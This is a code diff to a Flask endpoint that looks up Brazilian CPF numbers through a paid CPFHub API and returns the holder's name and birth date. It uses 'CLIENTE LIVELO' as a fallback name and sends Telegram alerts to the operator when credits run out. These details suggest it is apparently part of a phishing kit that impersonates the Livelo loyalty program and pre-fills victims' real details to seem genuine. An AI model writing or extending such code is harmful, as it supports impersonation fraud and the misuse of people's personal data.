@@ -478,31 +478,36 @@ def api_cpf():
     
     db = get_db()
     token_row = db.execute("SELECT value FROM sys_config WHERE key='cpf_token'").fetchone()
-    cpf_token = token_row["value"] if token_row and token_row["value"] else os.environ.get("CPF_API_TOKEN", "")
+    cpf_token = token_row["value"] if token_row and token_row["value"] else os.environ.get("CPFHUB_API_KEY", os.environ.get("CPF_API_TOKEN", ""))
     
-    # Exemplo de API genérica de CPF (Substitua pela API real do cliente)
-    # Se o token estiver vazio, usamos um mock para não quebrar o sistema
     if cpf_token and len(cpf_token) > 5:
         try:
             import requests
-            # Exemplo genérico de API (ajuste conforme a documentação da API real)
-            r = requests.get(f"https://api.consultacpf.com/v1/consulta/{cpf_val}?token={cpf_token}", timeout=8)
-            res = r.json()
+            r = requests.get(
+                f"https://api.cpfhub.io/cpf/{cpf_val}",
+                headers={"x-api-key": cpf_token},
+                timeout=10
+            )
             
-            # Checar se créditos estão acabando
-            creditos = res.get("saldo", 999)
-            if creditos <= 50:
+            if r.status_code == 200:
+                res = r.json()
+                if res.get("success"):
+                    data_cpf = res.get("data", {})
+                    return jsonify({
+                        "ok": True,
+                        "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
+                        "nome": data_cpf.get("nameUpper", data_cpf.get("name", "CLIENTE LIVELO")),
+                        "nome_mae": "",
+                        "data_nasc": data_cpf.get("birthDate", "01/01/1990")
+                    })
+            elif r.status_code == 401:
+                log.error("CPFHub API Key inválida!")
+            elif r.status_code == 403:
+                log.error("CPFHub: Limite de créditos excedido ou conta bloqueada!")
                 import threading
-                threading.Thread(target=send_telegram_notify, args=("", f"⚠️ AVISO: Seus créditos na API de CPF estão acabando! Restam: {creditos}")).start()
-                
-            if res.get("status") == "success":
-                return jsonify({
-                    "ok": True,
-                    "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
-                    "nome": res.get("nome", "Cliente Livelo"),
-                    "nome_mae": res.get("nome_mae", ""),
-                    "data_nasc": res.get("data_nasc", "01/01/1990")
-                })
+                threading.Thread(target=send_telegram_notify, args=("", "⚠️ AVISO URGENTE: Seus créditos na API de CPF (CPFHub) acabaram ou a conta foi bloqueada!")).start()
+            elif r.status_code == 404:
+                log.warning(f"CPF {cpf_val} não encontrado na base.")
         except Exception as e:
             log.error("CPF API Error: %s", e)
     
